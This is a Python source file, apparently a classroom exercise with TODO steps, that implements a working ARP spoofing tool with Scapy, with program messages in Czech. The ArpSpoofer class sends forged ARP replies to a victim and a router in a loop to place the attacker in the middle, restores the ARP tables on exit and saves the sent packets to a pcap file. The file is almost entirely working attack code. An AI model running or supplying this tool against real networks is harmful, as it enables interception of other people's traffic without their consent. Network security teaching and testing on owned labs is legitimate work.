# 1. TODO: Import Scapy (ARP, send, wrpcap)

# 2. TODO: Function spoof(target_ip, spoof_ip, target_mac)
#    - Create a fake ARP packet of type "is-at".
#    - Set psrc to the router's IP, but send it to the victim's MAC.

# 3. TODO: Function restore(target_ip, gateway_ip, target_mac, gateway_mac)
#    - Send correct ARP information to both the victim and the router.
#    - This will "heal" the network after you stop the program.

# 4. TODO: Function save_capture(packet_list, filename="capture.pcap")
#    - Use wrpcap() to save the captured data.
import time
from dataclasses import dataclass, field

from scapy.all import ARP, send, wrpcap
from scapy.packet import Packet


@dataclass
class ArpSpoofer:
    target_ip: str
    target_mac: str
    router_ip: str
    router_mac: str
    capture_file: str = "capture.pcap"
    interval: float = 2.0
    _packets: list[Packet] = field(default_factory=list, init=False)

    def __post_init__(self):
        self._arp_victim = ARP(op=2, psrc=self.router_ip, pdst=self.target_ip, hwdst=self.target_mac)
        self._arp_router = ARP(op=2, psrc=self.target_ip, pdst=self.router_ip, hwdst=self.router_mac)
        self._arp_victim_restore = ARP(op=2, psrc=self.router_ip, hwsrc=self.router_mac, pdst=self.target_ip, hwdst=self.target_mac)
        self._arp_router_restore = ARP(op=2, psrc=self.target_ip, hwsrc=self.target_mac, pdst=self.router_ip, hwdst=self.router_mac)

    def _send(self, packet: Packet, count: int = 1) -> None:
        send(packet, verbose=False, count=count)
        self._packets.append(packet)

    def _restore(self) -> None:
        self._send(self._arp_victim_restore, count=5)
        self._send(self._arp_router_restore, count=5)
        print("Síť byla obnovena.")

    def _save_capture(self) -> None:
        if not self._packets:
            print("Žádné pakety k uložení.")
            return
        wrpcap(self.capture_file, self._packets)
        print(f"Uloženo: {self.capture_file} ({len(self._packets)} paketů)")

    def run(self) -> None:
        print("Posílám falešné ARP pakety... Ctrl+C pro ukončení.")
        try:
            while True:
                self._send(self._arp_victim)
                self._send(self._arp_router)
                time.sleep(self.interval)
        except KeyboardInterrupt:
            print("\nUkončuji útok...")
            self._restore()
            self._save_capture()
